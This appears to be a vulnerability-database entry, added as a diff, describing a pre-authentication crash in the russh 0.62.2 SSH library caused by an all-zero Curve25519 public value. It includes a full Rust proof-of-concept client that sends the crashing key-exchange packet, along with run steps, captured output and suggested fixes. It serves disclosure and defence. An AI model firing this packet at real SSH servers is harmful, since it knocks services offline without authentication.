@@ -1,0 +1,373 @@
+[basic]
+description = '''
+A pre-authentication denial-of-service panic in `russh` 0.62.2 (commit
+`c4be19f1915c8682f4615c3fd50008512b474491`, current default branch `main` as
+of 2026-07-22). An unauthenticated client sends a single `SSH_MSG_KEX_ECDH_INIT`
+whose `Q_C` is 32 zero bytes. russh's Curve25519 KEX does not reject the
+all-zero peer public value, so `server_dh()` computes the all-zero shared
+secret and `compute_exchange_hash()` then calls `encode_mpint(&shared.0, ...)`,
+which indexes `s[i]` at `i == s.len()` and **panics** (`index out of bounds:
+the len is 32 but the index is 32`) **before host-key signature verification**.
+The server KEX task dies on the first KEX message, before authentication.
+
+This is reachable with the **default** server configuration
+(`Config::default()` → `Preferred::DEFAULT`, whose kex list includes
+`curve25519-sha256`) and requires **no caller-supplied parameter**. It is
+reproduced end-to-end against the unmodified real russh 0.62.2 library (a real
+server + raw TCP client over TCP); the PoC below links the real crate, not a
+copied snippet. The defect is still present on `main` HEAD (`v0.62.3`,
+2026-07-22) and is not covered by any of the 11 published russh GHSA advisories
+(GHSA-cqvm-j2r2-hwpg / CVE-2023-28113 is modp DH group validation, not
+Curve25519).
+
+Rust bounds-checked panics abort the task safely (no memory corruption / RCE);
+the impact is remote **denial of service**.
+
+## Details
+
+`russh/src/kex/curve25519.rs`, `server_dh()` (server path; attacker = client):
+
+```rust
+fn server_dh(&mut self, exchange: &mut Exchange, payload: &[u8]) -> Result<(), crate::Error> {
+    // only the 32-byte length is checked, NOT zero / low-order:
+    let mut pubkey = MontgomeryPoint([0; 32]);
+    pubkey.0.clone_from_slice(&payload[5..5 + 32]);      // line 73
+    ...
+    let shared = server_secret * client_pubkey;           // all-zero when client_pubkey == [0;32]
+    self.shared_secret = Some(shared);                    // line 86
+    Ok(())
+}
+```
+
+The server then computes the exchange hash **before** verifying the host-key
+signature (`russh/src/server/kex.rs`):
+
+```rust
+kex.server_dh(exchange, &input.buffer)?;                    // line 247
+...
+let hash = kex.compute_exchange_hash(&pubkey_vec, exchange, &mut buffer)?;  // line 274 — panics
+```
+
+`compute_exchange_hash()` calls `encode_mpint(&shared.0, buffer)`, whose
+leading-zero skip loop advances `i` to `s.len()` and then indexes `s[i]`
+(`russh/src/kex/mod.rs`):
+
+```rust
+pub(crate) fn encode_mpint<W: Writer>(s: &[u8], w: &mut W) -> Result<(), Error> {
+    let mut i = 0;
+    while i < s.len() && s[i] == 0 { i += 1 }   // i advances to s.len() for all-zero input
+    if s[i] & 0x80 != 0 {                        // line 482 — index out of bounds: s[s.len()]
+        ...
+```
+
+On Curve25519, `scalar * MontgomeryPoint([0;32])` yields `MontgomeryPoint([0;32])`
+(the identity element), so the all-zero shared secret is attacker-controlled.
+RFC 7748 §6 requires implementations to detect and reject all-zero / low-order
+peer public values and shared secrets; russh does not. The client path
+(`compute_shared_secret`, curve25519.rs:110-142) has the same chain but is
+reached only after the server host-key signature is verified, so it requires a
+malicious server that can sign its own host key (same root cause, lower
+severity).
+
+## PoC
+
+The PoC is a standalone `examples/` binary that links the **unmodified** real
+russh 0.62.2 crate and reproduces over a real TCP connection. It runs an ATTACK
+case (all-zero `Q_C` → panic) and a CONTROL case (random `Q_C` → completes kex),
+proving the panic is caused specifically by the all-zero value.
+
+### One-line reproducer
+
+```bash
+# Drop the .rs below into russh/examples/ of a checkout of
+# Eugeny/russh @ c4be19f1915c (tag v0.62.2), then:
+cargo +stable build --release --example e2e_t13_zero_curve25519
+RUST_BACKTRACE=1 ./target/release/examples/e2e_t13_zero_curve25519
+```
+
+### `russh/examples/e2e_t13_zero_curve25519.rs`
+
+```rust
+// End-to-end PoC: a pre-auth all-zero Curve25519 peer public value panics
+// russh's SSH exchange-hash computation.
+//
+// A real `russh::server` with `Config::default()` (curve25519-sha256 in the
+// default kex list) + a real Ed25519 host key is started on a TCP listener.
+// A raw TCP \"attacker\" client sends: SSH banner -> SSH_MSG_KEXINIT offering
+// curve25519-sha256 -> SSH_MSG_KEX_ECDH_INIT with Q_C = 32 zero bytes.
+// The server drives the real path server_dh -> compute_exchange_hash ->
+// encode_mpint and panics. A CONTROL case with a random Q_C completes kex.
+
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+
+use byteorder::{BigEndian, ByteOrder};
+use russh::server::{self, Handler};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::{TcpListener, TcpStream};
+
+const MSG_KEXINIT: u8 = 20;
+const MSG_KEX_ECDH_INIT: u8 = 30;  // RFC 8731 §3
+const MSG_KEX_ECDH_REPLY: u8 = 31;
+
+#[tokio::main]
+async fn main() {
+    println!(\"=== russh pre-auth all-zero Curve25519 panic (real russh 0.62.2) ===\n\");
+
+    let (atk_panic, atk_reply) = run_case(QcKind::AllZero, \"ATTACK \").await;
+    println!();
+    let (ctl_panic, ctl_reply) = run_case(QcKind::Random, \"CONTROL\").await;
+
+    println!(\"\n=== summary ===\");
+    println!(\"case    | server panicked | got ECDH_REPLY\");
+    println!(\"ATTACK  | {atk_panic:<15} | {atk_reply}   (Q_C = all-zero)\");
+    println!(\"CONTROL | {ctl_panic:<15} | {ctl_reply}   (Q_C = random non-zero)\");
+
+    if atk_panic && !atk_reply && !ctl_panic && ctl_reply {
+        println!(\"\n=> CONFIRMED (end-to-end, real russh 0.62.2):\");
+        println!(\"   A single pre-auth SSH_MSG_KEX_ECDH_INIT whose Q_C is the\");
+        println!(\"   all-zero Curve25519 point makes the real russh server panic\");
+        println!(\"   inside encode_mpint (index out of bounds: len 32, index 32)\");
+        println!(\"   during compute_exchange_hash, BEFORE host-key verification.\");
+    } else {
+        eprintln!(\"NOT reproduced\");
+        std::process::exit(1);
+    }
+}
+
+enum QcKind { AllZero, Random }
+
+async fn run_case(qc: QcKind, label: &'static str) -> (bool, bool) {
+    let panicked = Arc::new(AtomicBool::new(false));
+    {
+        let flag = panicked.clone();
+        let prev = std::panic::take_hook();
+        std::panic::set_hook(Box::new(move |info| {
+            flag.store(true, Ordering::SeqCst);
+            eprintln!(\"[{label} server task panicked] {info}\");
+            prev(info);
+        }));
+    }
+
+    // real russh server, DEFAULT config (curve25519-sha256 in the kex list)
+    // + real Ed25519 host key.
+    let mut config = server::Config::default();
+    config.inactivity_timeout = None;
+    config.auth_rejection_time = std::time::Duration::from_millis(1);
+    config.auth_rejection_time_initial = Some(std::time::Duration::from_millis(1));
+    config.keys.push(
+        russh::keys::PrivateKey::random(&mut rand::rng(), russh::keys::Algorithm::Ed25519).unwrap(),
+    );
+    let config = Arc::new(config);
+
+    let listener = TcpListener::bind(\"127.0.0.1:0\").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let server_task = tokio::spawn(async move {
+        let (socket, _peer) = listener.accept().await.unwrap();
+        let session = server::run_stream(config, socket, NoopHandler).await.unwrap();
+        session.await
+    });
+
+    // raw attacker client: SSH banner -> KEXINIT -> ECDH_INIT(Q_C)
+    let mut s = TcpStream::connect(addr).await.unwrap();
+    s.write_all(b\"SSH-2.0-attacker\r\n\").await.unwrap();
+    s.flush().await.unwrap();
+    let _server_id = read_ssh_id(&mut s).await.unwrap();
+    let _server_kexinit = read_packet(&mut s).await.unwrap();
+    s.write_all(&ssh_packet(&kexinit_payload_curve25519())).await.unwrap();
+    s.flush().await.unwrap();
+
+    let q_c: [u8; 32] = match qc {
+        QcKind::AllZero => [0u8; 32],
+        QcKind::Random => {
+            let mut b: [u8; 32] = rand::random();
+            if b.iter().all(|&x| x == 0) { b[0] = 1; }
+            b
+        }
+    };
+    let mut ecdh_init = Vec::new();
+    ecdh_init.push(MSG_KEX_ECDH_INIT);
+    encode_string(&mut ecdh_init, &q_c);
+    s.write_all(&ssh_packet(&ecdh_init)).await.unwrap();
+    s.flush().await.unwrap();
+    let qdesc = match qc { QcKind::AllZero => \"all-zero\", QcKind::Random => \"random\" };
+    println!(\"[{label}] sent SSH_MSG_KEX_ECDH_INIT (Q_C = {qdesc})\");
+
+    let got_reply = match tokio::time::timeout(std::time::Duration::from_millis(800), read_packet(&mut s)).await {
+        Ok(Ok(pkt)) => {
+            let is_reply = pkt.first() == Some(&MSG_KEX_ECDH_REPLY);
+            println!(\"[{label}] server sent a packet, first byte = {:?} (ECDH_REPLY={is_reply})\", pkt.first());
+            is_reply
+        }
+        _ => { println!(\"[{label}] read failed / connection closed (no ECDH_REPLY)\"); false }
+    };
+
+    let _ = tokio::time::timeout(std::time::Duration::from_secs(1), server_task).await;
+    let server_panicked = panicked.load(Ordering::SeqCst);
+    println!(\"[{label}] server task panicked = {server_panicked}, got ECDH_REPLY = {got_reply}\");
+    let _ = std::panic::take_hook();
+    (server_panicked, got_reply)
+}
+
+#[derive(Clone)]
+struct NoopHandler;
+impl Handler for NoopHandler { type Error = russh::Error; }
+
+fn kexinit_payload_curve25519() -> Vec<u8> {
+    let mut p = Vec::new();
+    p.push(MSG_KEXINIT);
+    p.extend_from_slice(&[0u8; 16]); // cookie
+    encode_name_list(&mut p, &[\"curve25519-sha256\"]);          // kex
+    encode_name_list(&mut p, &[\"ssh-ed25519\"]);                // host key
+    encode_name_list(&mut p, &[\"chacha20-poly1305@openssh.com\"]); // c2s cipher
+    encode_name_list(&mut p, &[\"chacha20-poly1305@openssh.com\"]); // s2c cipher
+    encode_name_list(&mut p, &[\"hmac-sha2-256\"]);              // c2s mac
+    encode_name_list(&mut p, &[\"hmac-sha2-256\"]);              // s2c mac
+    encode_name_list(&mut p, &[\"none\"]);                      // c2s compression
+    encode_name_list(&mut p, &[\"none\"]);                      // s2c compression
+    encode_name_list(&mut p, &[]);                            // c2s languages
+    encode_name_list(&mut p, &[]);                            // s2c languages
+    p.push(0);                                                // first_kex_packet_follows = false
+    push_u32(&mut p, 0);                                      // reserved
+    p
+}
+
+fn ssh_packet(payload: &[u8]) -> Vec<u8> {
+    let mut padding_len = 8 - ((5 + payload.len()) % 8);
+    if padding_len < 4 { padding_len += 8; }
+    let packet_len = 1 + payload.len() + padding_len;
+    let mut packet = Vec::with_capacity(4 + packet_len);
+    push_u32(&mut packet, packet_len as u32);
+    packet.push(padding_len as u8);
+    packet.extend_from_slice(payload);
+    packet.resize(packet.len() + padding_len, 0);
+    packet
+}
+
+async fn read_packet(stream: &mut TcpStream) -> std::io::Result<Vec<u8>> {
+    let mut len_buf = [0u8; 4];
+    stream.read_exact(&mut len_buf).await?;
+    let packet_len = BigEndian::read_u32(&len_buf) as usize;
+    let mut packet = vec![0u8; packet_len];
+    stream.read_exact(&mut packet).await?;
+    let padding_len = packet[0] as usize;
+    Ok(packet[1..packet.len() - padding_len].to_vec())
+}
+
+async fn read_ssh_id(stream: &mut TcpStream) -> std::io::Result<Vec<u8>> {
+    let mut id = Vec::new();
+    loop {
+        let mut byte = [0u8; 1];
+        stream.read_exact(&mut byte).await?;
+        id.push(byte[0]);
+        if byte[0] == b'\n' { return Ok(id); }
+    }
+}
+
+fn encode_name_list(buf: &mut Vec<u8>, names: &[&str]) { encode_string(buf, names.join(\",\").as_bytes()); }
+fn encode_string(buf: &mut Vec<u8>, value: &[u8]) { push_u32(buf, value.len() as u32); buf.extend_from_slice(value); }
+fn push_u32(buf: &mut Vec<u8>, value: u32) {
+    let mut bytes = [0u8; 4];
+    BigEndian::write_u32(&mut bytes, value);
+    buf.extend_from_slice(&bytes);
+}
+```
+
+Real captured output (ATTACK, `RUST_BACKTRACE=1`):
+
+```
+[ATTACK ] sent SSH_MSG_KEX_ECDH_INIT (Q_C = all-zero)
+[ATTACK  server task panicked] panicked at russh/src/kex/mod.rs:482:8:
+index out of bounds: the len is 32 but the index is 32
+thread 'tokio-rt-worker' panicked at russh/src/kex/mod.rs:482:8
+stack backtrace:
+   3: russh::kex::encode_mpint::<CryptoVec>
+   4: <Curve25519Kex as KexAlgorithmImplementor>::compute_exchange_hash
+   5: <ServerKex>::step ... server::reply ... Session::run
+[ATTACK ] server task panicked = true, got ECDH_REPLY = false
+[CONTROL] server sent a packet, first byte = Some(31) (ECDH_REPLY=true)
+[CONTROL] server task panicked = false, got ECDH_REPLY = true
+=> CONFIRMED (end-to-end, real russh 0.62.2)
+```
+
+The backtrace confirms the real in-library call path on a tokio worker,
+pre-authentication, before any host-key signature verification.
+
+## Impact
+
+**Remote, pre-authentication denial of service of any russh SSH server using
+the default configuration.** A single 37-byte `SSH_MSG_KEX_ECDH_INIT` (`0x1e`
++ `0x00000020` + 32 zero bytes) from an unauthenticated client crashes the
+server's KEX task before authentication. Because the panic is in an async russh
+task it aborts that connection's handler; depending on the embedder's panic
+containment it can also tear down the server if the panic is not contained
+per-connection.
+
+A malicious SSH server can symmetrically crash a russh **client** after
+host-key verification by sending an all-zero `Q_S` in
+`SSH_MSG_KEX_ECDH_REPLY` (same root cause, lower severity — requires the
+server to control its own signed host key).
+
+No confidentiality/integrity break is demonstrated. The all-zero shared secret
+would itself be a catastrophic key-compromise if russh did not already crash,
+but the observed impact is the crash.
+
+### CVSS
+
+- `AV:N` — reachable from a remote SSH peer
+- `AC:L` — requires only a 32-byte all-zero `Q_C`
+- `PR:N` — pre-authentication
+- `UI:N` — no user interaction
+- `C:N`, `I:N` — no confidentiality or integrity impact demonstrated
+- `A:H` — remote unauthenticated crash of the server KEX task
+
+### Suggested fixes
+
+Reject all-zero / low-order Curve25519 peer public values (RFC 7748 §6) in
+`server_dh()` / `compute_shared_secret()`:
+
+```rust
+if client_pubkey.0 == [0u8; 32] { return Err(crate::Error::Kex); }
+```
+
+and harden `encode_mpint` against the all-zero input:
+
+```rust
+if i == s.len() {
+    return 0u32.encode(w);   // all-zero mpint = empty string per RFC 4251 §5
+}
+```
+
+### Affected versions
+
+- `russh` **<= 0.62.3** (commit `c4be19f1915c` / current `main` HEAD
+  `v0.62.3`, 2026-07-22). The bug is still present on `main`; it is not covered
+  by any of the 11 published russh GHSA advisories. Default `server::Config`
+  and `client::Config` are affected (no feature flag or opt-in).
+
+## Credit
+
+Independently reported by [Zhaodl1](https://github.com/Zhaodl1) and the diff/ambidiff security research effort (afldl).
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Russh: Pre-auth remote panic via all-zero Curve25519 peer public value (encode_mpint OOB)"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-5xvq-cp9x-6p6r"]
+ave_id = "AVE-2026-1013"
+
+[meta]
+collected_at = "2026-08-05T19:49:49.277035911+00:00"
+status = "completed"
+
+[references]
+urls = []
